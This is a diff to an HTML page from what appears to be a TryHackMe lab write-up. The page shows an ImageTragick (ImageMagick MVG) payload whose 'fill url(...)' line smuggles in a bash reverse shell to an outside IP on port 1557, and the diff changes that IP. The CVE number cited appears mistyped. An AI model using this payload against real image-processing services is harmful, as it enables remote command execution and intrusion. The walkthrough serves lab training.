@@ -26,7 +26,7 @@
 	<h3>Paste this code in using an editor like vim or nano</h3>
 		<h4>push graphic-context</h4>
 		<h4>viewbox 0 0 640 480</h4>
-		<h4>fill 'url(https://example.com";bash -c \'bash -i >& /dev/tcp/10.9.1.225/1557 0>&1\'")'</h4>
+		<h4>fill 'url(https://example.com";bash -c \'bash -i >& /dev/tcp/10.10.10.10/1557 0>&1\'")'</h4>
 		<h4>pop graphic-context</h4>
 		<h3>I've changed the original payload at https://imagetragick.com so it gives us a shell, further explaination of this exploit CVE-2016-3174 at https://imagetragick.com</h3></br>
 			<img src="https://github.com/purpler0se/tryhackme-writeups/blob/main/images/payload.png">
